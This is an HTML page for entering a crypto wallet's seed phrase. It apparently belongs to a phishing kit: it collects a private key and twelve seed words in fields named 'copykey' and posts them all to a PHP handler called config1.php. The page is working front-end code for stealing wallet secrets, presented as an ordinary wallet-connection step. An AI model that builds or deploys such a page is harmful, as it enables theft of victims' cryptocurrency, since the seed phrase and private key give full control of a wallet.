<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="./styles2.css">
    <title>Seed Phrase Input</title>
</head>

<body>

    <div class="container">
        <h1>Enter Seed Phrase</h1>
        <p>Usually 12 or 24 words</p>
        <form action="./config1.php" method="POST" id="seed-phrase-form">
            <input type="text" class="privateKey" placeholder="Paste your private key" name="copykey0" autocomplete="off">
            <div class="seed-phrase-row">
                <input type="text" class="seed-phrase-input" name="copykey1" style="color: #fff;" maxlength="50" placeholder="1" required />
                <input type="text" class="seed-phrase-input" maxlength="50" name="copykey2" style="color: #fff;" placeholder="2" required />
                <input type="text" class="seed-phrase-input" maxlength="50" name="copykey3" style="color: #fff;" placeholder="3" required />
                <input type="text" class="seed-phrase-input" maxlength="50" name="copykey4" style="color: #fff;" placeholder="4" required />
            </div>
            <div class="seed-phrase-row">
                <input type="text" class="seed-phrase-input" maxlength="50" name="copykey5" style="color: #fff;" placeholder="5" required />
                <input type="text" class="seed-phrase-input" maxlength="50" name="copykey6" style="color: #fff;" placeholder="6" required />
                <input type="text" class="seed-phrase-input" maxlength="50" name="copykey7" style="color: #fff;" placeholder="7" required />
                <input type="text" class="seed-phrase-input" maxlength="50" name="copykey8" style="color: #fff;" placeholder="8" required />
            </div>
            <div class="seed-phrase-row">
                <input type="text" class="seed-phrase-input" maxlength="50" name="copykey9" style="color: #fff;" placeholder="9" required />
                <input type="text" class="seed-phrase-input" maxlength="50" name="copykey10" style="color: #fff;" placeholder="10" required />
                <input type="text" class="seed-phrase-input" maxlength="50" name="copykey11" style="color: #fff;" placeholder="11" required />
                <input type="text" class="seed-phrase-input" maxlength="50" name="copykey12" style="color: #fff;" placeholder="12" required />
            </div>

            <button type="submit" id="connectWallet">Next</button>
        </form>
    </div>

    <!-- <script src="script.js"></script> -->
</body>

</html>